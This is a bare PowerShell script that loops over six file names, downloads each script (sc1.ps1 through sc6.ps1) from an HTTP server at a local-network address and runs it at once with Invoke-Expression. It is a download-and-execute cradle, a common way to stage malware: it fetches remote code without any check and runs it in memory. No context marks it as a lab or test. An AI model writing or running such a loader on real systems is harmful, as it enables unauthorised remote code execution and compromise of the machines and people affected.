for ($i = 1; $i -le 6; $i++) {
   
    $url = "http://192.168.1.4:8000/sc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}